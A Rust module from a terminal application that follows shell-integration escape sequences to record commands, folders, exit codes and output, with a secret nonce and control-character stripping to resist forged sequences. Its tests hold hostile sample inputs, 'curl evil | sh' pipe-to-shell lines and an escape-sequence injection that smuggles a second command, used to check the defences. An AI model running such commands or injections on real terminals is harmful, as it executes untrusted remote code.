//! Follows a shell's output to learn what it is doing, from the OSC sequences the shell
//! integration emits (and fish, Nushell and others emit natively):
//!
//! - `133;A` prompt start · `133;B` input start · `133;C` command output start ·
//!   `133;D;<exit>` command finished (VS Code's `633;A`–`D` are read the same way);
//! - `633;E;<command line>` the command line, with VS Code's escaping (`\\`, `\xHH`);
//! - `7;file://<host>/<path>` and `9;9;<path>` the current folder (`633;P;Cwd=<path>` too).
//!
//! Output is untrusted: any program (or a file being `cat`ed) can print these sequences. So
//! when the terminal injected its own integration, a command line only counts if its `633;E`
//! carries the session's secret nonce (`633;E;<command>;<nonce>`), the folder only changes
//! between commands, and control characters never reach a recorded command line.
//!
//! BEL and ST (`ESC \`) terminators both work, and sequences may be split anywhere across
//! chunks. Each finished command comes out as a [`FinishedCommand`] with the clean text of its
//! last 16 KiB of output (kept for AI context and history).

use std::mem;

use genslate_storage::now_ms;
use vte::{Params, Parser, Perform};

/// The most output text kept per command.
pub const OUTPUT_TAIL_LIMIT: usize = 16 * 1024;
/// The longest command line kept when it has to be read back from the echoed input.
const TYPED_LIMIT: usize = 8 * 1024;

/// A command the shell reported as finished.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FinishedCommand {
    /// The command line as typed (a leading space is kept; trailing whitespace is not).
    pub command: String,
    /// The folder it ran in (the last one the shell reported before it started).
    pub cwd: Option<String>,
    /// `None` when the shell does not report exit codes (Command Prompt).
    pub exit_code: Option<i32>,
    /// Ms since the Unix epoch.
    pub started_at: i64,
    pub duration_ms: i64,
    /// Printable output (no escape sequences), at most [`OUTPUT_TAIL_LIMIT`] bytes, trimmed.
    pub output_tail: String,
}

/// Where the shell is in its prompt/command cycle.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Phase {
    /// No integration seen yet, or between D and A.
    Idle,
    /// Drawing the prompt (A → B).
    Prompt,
    /// The user is typing (B → C).
    Input,
    /// A command is running (C → D).
    Running,
}

/// Parses a shell's output stream; see the module docs.
pub struct Tracker {
    parser: Parser,
    state: State,
}

impl std::fmt::Debug for Tracker {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Tracker")
            .field("phase", &self.state.phase)
            .field("cwd", &self.state.cwd)
            .field("running", &self.state.running)
            .finish_non_exhaustive()
    }
}

#[derive(Debug)]
struct State {
    windows: bool,
    /// The secret our integration scripts append to `633;E`; `None` for shells that report
    /// on their own (fish, Nushell) or not at all.
    nonce: Option<String>,
    now: i64,
    phase: Phase,
    cwd: Option<String>,
    /// The folder when the running command started.
    started_cwd: Option<String>,
    /// From `633;E`, waiting for `133;C`.
    reported: Option<String>,
    /// The echoed input between B and C (used when no `633;E` came).
    typed: String,
    running: Option<String>,
    started_at: i64,
    tail: String,
    /// A `\r` was seen: the next printed character overwrites the current line.
    carriage_return: bool,
    last_command: Option<String>,
    finished: Vec<FinishedCommand>,
}

impl Default for Tracker {
    fn default() -> Self {
        Self::new()
    }
}

impl Tracker {
    /// A tracker for this OS's paths.
    pub fn new() -> Self {
        Self::for_platform(cfg!(windows))
    }

    /// A tracker for Windows (`windows = true`: `file://host/C:/x` → `C:\x`) or Unix paths.
    pub fn for_platform(windows: bool) -> Self {
        Self::with_nonce(windows, None)
    }

    /// A tracker for a shell running our integration with `nonce`: only command lines that
    /// carry it are believed (see the module docs).
    pub fn with_nonce(windows: bool, nonce: Option<String>) -> Self {
        Self {
            parser: Parser::new(),
            state: State {
                windows,
                nonce,
                now: 0,
                phase: Phase::Idle,
                cwd: None,
                started_cwd: None,
                reported: None,
                typed: String::new(),
                running: None,
                started_at: 0,
                tail: String::new(),
                carriage_return: false,
                last_command: None,
                finished: Vec::new(),
            },
        }
    }

    /// Feeds output read from the shell; returns the commands that finished in it.
    pub fn advance(&mut self, bytes: &[u8]) -> Vec<FinishedCommand> {
        self.advance_at(bytes, now_ms())
    }

    /// [`Tracker::advance`] with an explicit clock (ms since the Unix epoch).
    pub fn advance_at(&mut self, bytes: &[u8], now: i64) -> Vec<FinishedCommand> {
        self.state.now = now;
        self.parser.advance(&mut self.state, bytes);
        mem::take(&mut self.state.finished)
    }

    /// The current folder, as last reported by the shell.
    pub fn cwd(&self) -> Option<&str> {
        self.state.cwd.as_deref()
    }

    /// The command running now, else the last one that ran.
    pub fn last_command(&self) -> Option<&str> {
        self.state
            .running
            .as_deref()
            .map(str::trim_start)
            .filter(|command| !command.is_empty())
            .or(self.state.last_command.as_deref())
    }

    /// `true` while a command reported with `133;C` has not finished.
    pub fn is_running(&self) -> bool {
        self.state.phase == Phase::Running
    }
}

impl State {
    fn prompt_start(&mut self) {
        if self.phase == Phase::Running {
            // A prompt without D: the shell can't report how the command ended.
            self.finish(None);
        }
        self.phase = Phase::Prompt;
    }

    fn input_start(&mut self) {
        self.phase = Phase::Input;
        self.typed.clear();
        self.reported = None;
    }

    fn command_start(&mut self) {
        let command = match self.reported.take() {
            Some(reported) => reported,
            // Our scripts always report the line; an unproven one is not recorded.
            None if self.nonce.is_some() => String::new(),
            None => mem::take(&mut self.typed),
        };
        self.typed.clear();
        // Leading whitespace is kept: history skips such commands (`HISTCONTROL=ignorespace`).
        self.running = Some(printable(&command).trim_end().to_owned());
        self.started_at = self.now;
        self.started_cwd.clone_from(&self.cwd);
        self.tail.clear();
        self.carriage_return = false;
        self.phase = Phase::Running;
    }

    fn command_end(&mut self, exit_code: Option<i32>) {
        if self.phase == Phase::Running {
            self.finish(exit_code);
        }
        self.phase = Phase::Idle;
    }

    fn finish(&mut self, exit_code: Option<i32>) {
        let command = self.running.take().unwrap_or_default();
        let output = mem::take(&mut self.tail);
        self.phase = Phase::Idle;
        if command.trim().is_empty() {
            return;
        }
        self.last_command = Some(command.trim_start().to_owned());
        self.finished.push(FinishedCommand {
            command,
            cwd: self.started_cwd.take(),
            exit_code,
            started_at: self.started_at,
            duration_ms: (self.now - self.started_at).max(0),
            output_tail: output.trim_end().to_owned(),
        });
    }

    fn set_cwd(&mut self, path: String) {
        // Shells report the folder at the prompt; while a command runs, it's program output.
        if !path.is_empty() && self.phase != Phase::Running {
            self.cwd = Some(path);
        }
    }

    fn push_output(&mut self, c: char) {
        if self.carriage_return && c != '\n' {
            // `\r` then text: a progress bar redrawing its line. Keep only the last drawing.
            let line_start = self.tail.rfind('\n').map_or(0, |at| at + 1);
            self.tail.truncate(line_start);
        }
        self.carriage_return = false;
        self.tail.push(c);
        if self.tail.len() > OUTPUT_TAIL_LIMIT + 4096 {
            let mut cut = self.tail.len() - OUTPUT_TAIL_LIMIT;
            while !self.tail.is_char_boundary(cut) {
                cut += 1;
            }
            self.tail.drain(..cut);
        }
    }
}

impl Perform for State {
    fn print(&mut self, c: char) {
        match self.phase {
            Phase::Input if self.typed.len() < TYPED_LIMIT => self.typed.push(c),
            Phase::Running => self.push_output(c),
            _ => {}
        }
    }

    fn execute(&mut self, byte: u8) {
        match (self.phase, byte) {
            (Phase::Input, 0x08) => {
                self.typed.pop();
            }
            (Phase::Running, b'\n') => {
                self.carriage_return = false;
                self.push_output('\n');
            }
            (Phase::Running, b'\r') => self.carriage_return = true,
            (Phase::Running, b'\t') => self.push_output('\t'),
            (Phase::Running, 0x08) if !self.tail.ends_with('\n') => {
                self.tail.pop();
            }
            _ => {}
        }
    }

    fn osc_dispatch(&mut self, params: &[&[u8]], _bell_terminated: bool) {
        let Some((&kind, rest)) = params.split_first() else {
            return;
        };
        match kind {
            b"133" | b"633" => self.shell_mark(kind, rest),
            b"7" => {
                if let Some(path) = file_url_path(&join(rest), self.windows) {
                    self.set_cwd(path);
                }
            }
            b"9" if rest.first() == Some(&&b"9"[..]) => {
                let path = join(&rest[1..]);
                let path = path.trim();
                let path = path
                    .strip_prefix('"')
                    .and_then(|path| path.strip_suffix('"'))
                    .unwrap_or(path);
                self.set_cwd(path.to_owned());
            }
            _ => {}
        }
    }

    fn csi_dispatch(&mut self, _params: &Params, _intermediates: &[u8], _ignore: bool, _c: char) {}
}

impl State {
    fn shell_mark(&mut self, kind: &[u8], rest: &[&[u8]]) {
        let Some(mark) = rest.first() else {
            return;
        };
        match *mark {
            b"A" => self.prompt_start(),
            b"B" => self.input_start(),
            b"C" => self.command_start(),
            b"D" => {
                let code = rest
                    .get(1)
                    .and_then(|code| std::str::from_utf8(code).ok())
                    .and_then(|code| code.trim().parse().ok());
                self.command_end(code);
            }
            b"E" if kind == b"633" => {
                let proven = match &self.nonce {
                    Some(nonce) => rest.get(2).is_some_and(|given| *given == nonce.as_bytes()),
                    None => true,
                };
                if proven {
                    self.reported = rest.get(1).map(|line| unescape(line));
                }
            }
            b"P" if kind == b"633" => {
                if let Some(cwd) = join(&rest[1..]).strip_prefix("Cwd=") {
                    self.set_cwd(unescape(cwd.as_bytes()));
                }
            }
            _ => {}
        }
    }
}

/// `text` without control characters (C0, DEL, C1; tabs become spaces): a recorded command
/// may be pasted back into a shell, where an escape or a carriage return would act.
fn printable(text: &str) -> String {
    text.chars()
        .filter_map(|c| match c {
            '\t' => Some(' '),
            c if c.is_control() => None,
            c => Some(c),
        })
        .collect()
}

/// OSC parameters joined back with the `;` the parser split them on.
fn join(params: &[&[u8]]) -> String {
    String::from_utf8_lossy(&params.join(&b';')).into_owned()
}

/// Undoes VS Code's `633` escaping: `\\` → `\`, `\xHH` → that byte.
pub fn unescape(bytes: &[u8]) -> String {
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'\\' if bytes.get(i + 1) == Some(&b'\\') => {
                out.push(b'\\');
                i += 2;
            }
            b'\\' if bytes.get(i + 1) == Some(&b'x') => {
                if let Some(byte) = bytes.get(i + 2..i + 4).and_then(hex_byte) {
                    out.push(byte);
                    i += 4;
                } else {
                    out.push(b'\\');
                    i += 1;
                }
            }
            byte => {
                out.push(byte);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hex_byte(digits: &[u8]) -> Option<u8> {
    u8::from_str_radix(std::str::from_utf8(digits).ok()?, 16).ok()
}

/// The local path in a `file://host/path` URL (host ignored), percent-decoded. On Windows,
/// `/C:/Users` becomes `C:\Users`.
pub fn file_url_path(url: &str, windows: bool) -> Option<String> {
    let rest = url.trim().strip_prefix("file://")?;
    let path = &rest[rest.find('/')?..];
    let mut decoded = percent_decode(path);
    if windows {
        let bytes = decoded.as_bytes();
        if bytes.len() >= 3
            && bytes[0] == b'/'
            && bytes[1].is_ascii_alphabetic()
            && bytes[2] == b':'
        {
            decoded.remove(0);
        }
        if decoded.as_bytes().get(1) == Some(&b':') {
            decoded = decoded.replace('/', "\\");
        }
    }
    Some(decoded)
}

fn percent_decode(text: &str) -> String {
    let bytes = text.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%'
            && let Some(byte) = bytes.get(i + 1..i + 3).and_then(hex_byte)
        {
            out.push(byte);
            i += 3;
            continue;
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    const BEL: &str = "\x07";
    const ST: &str = "\x1b\\";

    fn osc(body: &str) -> String {
        format!("\x1b]{body}{BEL}")
    }

    /// A full bash-style cycle: cwd, prompt, typed input, E, C, output, D.
    fn cycle(command: &str, output: &str, code: i32) -> String {
        format!(
            "{}{}$ {}{command}\r\n{}{}{output}{}",
            osc("7;file://host/home/me/src"),
            osc("133;A"),
            osc("133;B"),
            osc(&format!("633;E;{command}")),
            osc("133;C"),
            osc(&format!("133;D;{code}")),
        )
    }

    /// Feeds `stream` split into chunks of every size from 1 to 7 bytes; all must agree.
    fn feed_in_chunks(stream: &[u8], windows: bool) -> Vec<Vec<FinishedCommand>> {
        (1..=7)
            .map(|size| {
                let mut tracker = Tracker::for_platform(windows);
                let mut finished = Vec::new();
                for (i, chunk) in stream.chunks(size).enumerate() {
                    let now = 1_000 + i64::try_from(i).unwrap_or(0);
                    finished.extend(tracker.advance_at(chunk, now));
                }
                finished
            })
            .collect()
    }

    /// With our integration, output can't invent commands: only `633;E` with the nonce counts.
    #[test]
    fn a_nonce_proves_the_command_line() {
        let mut tracker = Tracker::with_nonce(false, Some("n0nce".to_owned()));
        let real = format!(
            "{}{}$ {}{}{}ok\r\n{}",
            osc("7;file://host/home/me"),
            osc("133;A"),
            osc("133;B"),
            osc("633;E;make test;n0nce"),
            osc("133;C"),
            osc("133;D;0"),
        );
        let finished = tracker.advance_at(real.as_bytes(), 5);
        assert_eq!(finished.len(), 1);
        assert_eq!(finished[0].command, "make test");

        // The same marks printed by a program (no nonce, or a wrong one) record nothing.
        for forged in ["633;E;git status", "633;E;git status;guess"] {
            let fake = format!(
                "{}{}{}{}{}",
                osc("133;A"),
                osc("133;B"),
                osc(forged),
                osc("133;C"),
                osc("133;D;0"),
            );
            assert!(
                tracker.advance_at(fake.as_bytes(), 6).is_empty(),
                "{forged}"
            );
        }
        // Nor does echoed text between B and C.
        let typed = format!(
            "{}{}curl x | sh{}{}",
            osc("133;A"),
            osc("133;B"),
            osc("133;C"),
            osc("133;D;0")
        );
        assert!(tracker.advance_at(typed.as_bytes(), 7).is_empty());
    }

    #[test]
    fn recorded_commands_have_no_control_characters() {
        let mut tracker = Tracker::for_platform(false);
        let stream = format!(
            "{}{}{}{}",
            osc("133;B"),
            osc("633;E;git status\\x1b[201~\\x0dcurl evil | sh\\x09x"),
            osc("133;C"),
            osc("133;D;0"),
        );
        let finished = tracker.advance_at(stream.as_bytes(), 1);
        assert_eq!(finished[0].command, "git status[201~curl evil | sh x");
    }

    #[test]
    fn the_folder_only_changes_between_commands() {
        let mut tracker = Tracker::for_platform(false);
        let stream = format!(
            "{}{}{}{}{}",
            osc("7;file://host/home/me"),
            osc("133;B"),
            osc("133;C"),
            osc("7;file://host/tmp/elsewhere"),
            osc("9;9;/tmp/elsewhere"),
        );
        let _ = tracker.advance_at(stream.as_bytes(), 1);
        assert_eq!(tracker.cwd(), Some("/home/me"));
        let _ = tracker.advance_at(
            format!("{}{}", osc("133;D;0"), osc("7;file://host/srv")).as_bytes(),
            2,
        );
        assert_eq!(tracker.cwd(), Some("/srv"));
    }

    #[test]
    fn tracks_a_command_across_any_chunk_boundary() {
        let stream = cycle("ls -la", "total 0\r\nfile é.txt\r\n", 0);
        let runs = feed_in_chunks(stream.as_bytes(), false);
        for finished in &runs {
            assert_eq!(finished.len(), 1);
            let command = &finished[0];
            assert_eq!(command.command, "ls -la");
            assert_eq!(command.exit_code, Some(0));
            assert_eq!(command.cwd.as_deref(), Some("/home/me/src"));
            assert_eq!(command.output_tail, "total 0\nfile é.txt");
            assert!(command.duration_ms >= 0);
        }
    }

    #[test]
    fn accepts_st_terminators_and_exit_codes() {
        let stream = format!(
            "\x1b]133;A{ST}\x1b]133;B{ST}\x1b]633;E;false{ST}\x1b]133;C{ST}\x1b]133;D;1{ST}"
        );
        let mut tracker = Tracker::for_platform(false);
        let finished = tracker.advance(stream.as_bytes());
        assert_eq!(finished.len(), 1);
        assert_eq!(finished[0].command, "false");
        assert_eq!(finished[0].exit_code, Some(1));
        assert_eq!(tracker.last_command(), Some("false"));
    }

    #[test]
    fn measures_duration_and_start_time() {
        let mut tracker = Tracker::for_platform(false);
        assert!(tracker.advance_at(osc("133;B").as_bytes(), 10).is_empty());
        tracker.advance_at(
            format!("{}{}", osc("633;E;sleep 2"), osc("133;C")).as_bytes(),
            1_000,
        );
        assert!(tracker.is_running());
        assert_eq!(tracker.last_command(), Some("sleep 2"));
        let finished = tracker.advance_at(osc("133;D;0").as_bytes(), 3_050);
        assert_eq!(finished[0].started_at, 1_000);
        assert_eq!(finished[0].duration_ms, 2_050);
        assert!(!tracker.is_running());
    }

    #[test]
    fn unescapes_vs_code_command_lines() {
        assert_eq!(unescape(br"echo a\x3bb\\c\x0anext"), "echo a;b\\c\nnext");
        assert_eq!(unescape(br"bad \xZZ and \q"), r"bad \xZZ and \q");
        assert_eq!(unescape(br"trailing \x4"), r"trailing \x4");
        let stream = format!(
            "{}{}{}",
            osc("133;B"),
            osc(r"633;E;git commit -m a\x3bb"),
            osc("133;C")
        );
        let mut tracker = Tracker::for_platform(false);
        tracker.advance(stream.as_bytes());
        let finished = tracker.advance(osc("133;D;0").as_bytes());
        assert_eq!(finished[0].command, "git commit -m a;b");
    }

    #[test]
    fn falls_back_to_the_echoed_input() {
        // No 633;E: the text echoed between B and C, with backspaces applied.
        let stream = format!(
            "{}{}git stq\x08 \x08atus\r\n{}out{}",
            osc("133;A"),
            osc("133;B"),
            osc("133;C"),
            osc("133;D;0"),
        );
        let runs = feed_in_chunks(stream.as_bytes(), false);
        for finished in runs {
            assert_eq!(finished[0].command, "git status");
        }
    }

    #[test]
    fn ignores_empty_commands_and_stray_marks() {
        let mut tracker = Tracker::for_platform(false);
        let stream = format!(
            "{}{}{}{}{}{}",
            osc("133;D;0"),
            osc("133;A"),
            osc("133;B"),
            osc("633;E;"),
            osc("133;C"),
            osc("133;D;0"),
        );
        assert!(tracker.advance(stream.as_bytes()).is_empty());
        assert!(tracker.advance(osc("133;D").as_bytes()).is_empty());
        assert_eq!(tracker.last_command(), None);
    }

    #[test]
    fn keeps_a_leading_space_for_history_privacy() {
        let stream = format!(
            "{}{}{}{}",
            osc("133;B"),
            osc("633;E; export TOKEN=x  "),
            osc("133;C"),
            osc("133;D;0")
        );
        let mut tracker = Tracker::for_platform(false);
        let finished = tracker.advance(stream.as_bytes());
        assert_eq!(finished[0].command, " export TOKEN=x");
        assert_eq!(tracker.last_command(), Some("export TOKEN=x"));
    }

    #[test]
    fn a_prompt_without_d_closes_the_command_without_a_code() {
        let stream = format!(
            "{}{}{}{}output\r\n{}",
            osc("133;A"),
            osc("133;B"),
            osc("633;E;dir"),
            osc("133;C"),
            osc("133;A")
        );
        let mut tracker = Tracker::for_platform(true);
        let finished = tracker.advance(stream.as_bytes());
        assert_eq!(finished.len(), 1);
        assert_eq!(finished[0].exit_code, None);
        assert_eq!(finished[0].output_tail, "output");
    }

    #[test]
    fn cmd_prompts_report_windows_folders() {
        // What the Command Prompt integration prints ($e]9;9;$P$e\), quoted or not.
        let mut tracker = Tracker::for_platform(true);
        tracker.advance(format!("\x1b]9;9;C:\\Users\\me{ST}").as_bytes());
        assert_eq!(tracker.cwd(), Some(r"C:\Users\me"));
        tracker.advance(format!("\x1b]9;9;\"D:\\a;b\"{BEL}").as_bytes());
        assert_eq!(tracker.cwd(), Some(r"D:\a;b"));
        tracker.advance(osc("633;P;Cwd=E:\\x3bwork").as_bytes());
        assert_eq!(tracker.cwd(), Some(r"E:;work"));
    }

    #[test]
    fn parses_file_urls() {
        assert_eq!(
            file_url_path("file://host/home/me/dir%20%C3%A9", false).as_deref(),
            Some("/home/me/dir é")
        );
        assert_eq!(file_url_path("file:///tmp", false).as_deref(), Some("/tmp"));
        assert_eq!(
            file_url_path("file://pc/C:/Users/me/My%20Docs", true).as_deref(),
            Some(r"C:\Users\me\My Docs")
        );
        assert_eq!(
            file_url_path("file://pc/c%3A/x", true).as_deref(),
            Some(r"c:\x")
        );
        assert_eq!(
            file_url_path("file://pc/mnt/c", true).as_deref(),
            Some("/mnt/c")
        );
        assert_eq!(file_url_path("http://x/y", false), None);
        assert_eq!(file_url_path("file://hostonly", false), None);
        assert_eq!(percent_decode("100%"), "100%");
    }

    #[test]
    fn keeps_clean_output_and_only_the_last_progress_frame() {
        let mut tracker = Tracker::for_platform(false);
        let stream = format!(
            "{}{}\x1b[1;32mgreen\x1b[0m\r\n 10%\r 50%\r100%\r\ndone\t!\r\n{}",
            osc("633;E;build"),
            osc("133;C"),
            osc("133;D;0")
        );
        let finished = tracker.advance(stream.as_bytes());
        assert_eq!(finished[0].output_tail, "green\n100%\ndone\t!");
    }

    #[test]
    fn output_tail_is_bounded() {
        let mut tracker = Tracker::for_platform(false);
        tracker.advance(format!("{}{}", osc("633;E;yes"), osc("133;C")).as_bytes());
        let line = "é".repeat(100) + "\r\n";
        for _ in 0..400 {
            tracker.advance(line.as_bytes());
        }
        tracker.advance(b"END");
        let finished = tracker.advance(osc("133;D;130").as_bytes());
        let tail = &finished[0].output_tail;
        assert!(tail.len() <= OUTPUT_TAIL_LIMIT + 4096, "{}", tail.len());
        assert!(tail.len() >= OUTPUT_TAIL_LIMIT - 4, "{}", tail.len());
        assert!(tail.ends_with("END"));
        assert_eq!(finished[0].exit_code, Some(130));
    }

    #[test]
    fn several_commands_in_one_chunk() {
        let stream = format!("{}{}", cycle("one", "1\r\n", 0), cycle("two", "2\r\n", 3));
        let mut tracker = Tracker::for_platform(false);
        let finished = tracker.advance(stream.as_bytes());
        let commands: Vec<(&str, Option<i32>)> = finished
            .iter()
            .map(|command| (command.command.as_str(), command.exit_code))
            .collect();
        assert_eq!(commands, [("one", Some(0)), ("two", Some(3))]);
        assert_eq!(tracker.last_command(), Some("two"));
    }

    #[test]
    fn remembers_the_folder_a_command_started_in() {
        let stream = format!(
            "{}{}{}{}{}{}",
            osc("7;file://h/start"),
            osc("133;B"),
            osc("633;E;cd /elsewhere"),
            osc("133;C"),
            osc("133;D;0"),
            // The scripts report the new folder with the next prompt.
            osc("7;file://h/elsewhere"),
        );
        let mut tracker = Tracker::for_platform(false);
        let finished = tracker.advance(stream.as_bytes());
        assert_eq!(finished[0].cwd.as_deref(), Some("/start"));
        assert_eq!(tracker.cwd(), Some("/elsewhere"));
    }
}
